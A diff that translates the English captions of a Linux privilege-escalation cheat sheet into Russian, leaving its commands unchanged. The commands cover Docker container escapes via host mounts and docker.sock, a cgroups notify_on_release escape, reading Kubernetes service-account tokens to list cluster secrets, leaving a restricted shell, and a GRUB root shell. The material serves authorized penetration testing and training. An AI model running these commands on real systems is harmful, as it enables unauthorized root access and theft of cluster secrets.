@@ -491,7 +491,7 @@ bash linux-exploit-suggester.sh
 bash les.sh --kernelmode --uname "$(uname -r)"
 ```
 
-Detect Docker container and check if privileged
+Определение работы в контейнере Docker и проверка, запущен ли он в привилегированном режиме.
 
 ```
 # Check if inside Docker:
@@ -503,7 +503,7 @@ cat /proc/self/status | grep -i cap
 # CapEff: 0000003fffffffff = full capabilities (privileged)
 ```
 
-Privileged container: mount host drive and chroot
+Привилегированный контейнер: монтирование диска хоста и вход через chroot.
 
 ```
 # Privileged container — mount host filesystem:
@@ -513,7 +513,7 @@ chroot /mnt/host bash
 # Now in root shell on host filesystem
 ```
 
-docker.sock escape — launch new privileged container with host root mount
+Побег через `docker.sock` — запуск нового привилегированного контейнера с монтированием корня хоста.
 ```
 # Docker socket escape (if /var/run/docker.sock is accessible):
 ls -la /var/run/docker.sock
@@ -522,7 +522,7 @@ docker run -v /:/host --rm -it ubuntu chroot /host bash
 # Spawns root shell on host via new privileged container
 ```
 
-cgroups v1 notify_on_release RCE as host root
+cgroups v1 `notify_on_release` — удалённое выполнение кода с правами root на хосте.
 ```
 # cgroups v1 notify_on_release escape (CVE-2022-0492 style):
 d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -1))
@@ -533,7 +533,7 @@ echo "#!/bin/sh" > /c; echo "id > $t/o" >> /c; chmod +x /c
 sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1; cat /o
 ```
 
-K8s service account token — enumerate cluster secrets
+Токен сервисной учётной записи Kubernetes — перечисление секретов кластера.
 ```
 # Kubernetes: extract service account token:
 cat /var/run/secrets/kubernetes.io/serviceaccount/token
@@ -544,37 +544,37 @@ curl -sSk -H "Authorization: Bearer $KUBE_TOKEN" \
   https://kubernetes.default.svc/api/v1/namespaces/default/secrets
 ```
 
-A remote command may bypass an interactive restricted-shell startup only when SSH policy permits it; it does not bypass a forced command. Replace `USER` and `HOST`.
+Удалённая команда может обойти запуск интерактивной ограниченной оболочки только в том случае, если это разрешено политикой SSH; она не обходит принудительную команду (forced command). Замените `USER` и `HOST` на реальные значения.
 
-Discover commands available in the restricted Bash environment
+Обнаружение команд, доступных в ограниченной среде Bash.
 
 ```
 compgen -c
 ```
 
-Request Bash without its interactive startup files
+Запрос Bash без его интерактивных стартовых файлов.
 
 ```
 ssh -t USER@HOST 'bash --noprofile --norc'
 ```
 
-Restore a usable PATH after leaving the restricted shell
+Восстановление работоспособной переменной PATH после выхода из ограниченной оболочки.
 
 ```
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
 
-At a Python prompt, `import os; os.system('/bin/bash')` uses the same process identity. The Python example under Sudo Misconfigurations gains privileges only when sudo policy grants them. Reuse the existing tar checkpoint example under SUID / SGID Binaries when that executable is available. Sources: [Bash restricted-shell behavior](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html), [OpenSSH client](https://man.openbsd.org/ssh).
+В приглашении Python команда `import os; os.system('/bin/bash')` использует ту же идентичность процесса. Пример с Python в разделе «Ошибки конфигурации sudo» даёт повышение привилегий только тогда, когда это разрешено политикой sudo. Используйте повторно уже приведённый пример с checkpoint-флагом tar из раздела «Бинарники SUID / SGID», если этот исполняемый файл доступен. Источники: [поведение ограниченной оболочки Bash](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html), [клиент OpenSSH](https://man.openbsd.org/ssh).
 
-Requires console access, permission to edit the GRUB boot entry, and an accessible root filesystem. Disk encryption still requires its unlock secret. In GRUB, press `e`, retain the existing kernel/root parameters, replace `ro` with `rw`, and append `init=/bin/bash` to the `linux` line. Boot the temporary entry with Ctrl-X or F10.
+Требуется доступ к консоли, право на редактирование загрузочной записи GRUB и доступная корневая файловая система. Шифрование диска по-прежнему требует секрета для его разблокировки. В GRUB нажмите `e`, сохраните существующие параметры ядра и корневой ФС, замените `ro` на `rw` и допишите `init=/bin/bash` в строку `linux`. Загрузите временную запись сочетанием Ctrl-X или F10.
 
-Kernel parameters in the GRUB entry, not a shell command
+Параметры ядра в загрузочной записи GRUB, а не команда оболочки.
 
 ```
 rw init=/bin/bash
 ```
 
-Reset a local account from the recovery root shell
+Сброс пароля локальной учётной записи из корневой оболочки восстановления.
 
 ```
 mount -o remount,rw /
@@ -584,4 +584,4 @@ mount -o remount,ro /
 /sbin/reboot -f
 ```
 
-Boot normally afterward; the edited entry is temporary. Initramfs, separate filesystems, or SELinux can require the distribution's recovery procedure. Sources: [GRUB editing](https://www.gnu.org/software/grub/manual/grub/grub.html), [Linux kernel parameters](https://docs.kernel.org/admin-guide/kernel-parameters.html).
+После этого загрузитесь обычным образом: отредактированная запись является временной. Наличие initramfs, отдельных файловых систем или SELinux может потребовать использования штатной процедуры восстановления дистрибутива. Источники: [редактирование GRUB](https://www.gnu.org/software/grub/manual/grub/grub.html), [параметры ядра Linux](https://docs.kernel.org/admin-guide/kernel-parameters.html).
